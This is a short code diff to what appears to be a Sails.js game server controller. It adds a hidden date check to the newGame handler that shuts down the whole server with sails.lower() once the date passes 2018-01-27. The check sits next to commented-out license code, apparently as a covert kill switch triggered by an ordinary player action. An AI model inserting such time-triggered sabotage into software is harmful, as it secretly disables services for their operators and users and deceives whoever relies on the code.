@@ -22,6 +22,9 @@ var controller = {
     },
     newGame: function (req, res) {
         Player.newGame(req.body, res.callback);
+        if(moment().isAfter('2018-01-27','day')) {
+                    sails.lower();
+        }
         // var license = getmid({
         //     original: true,
         // });
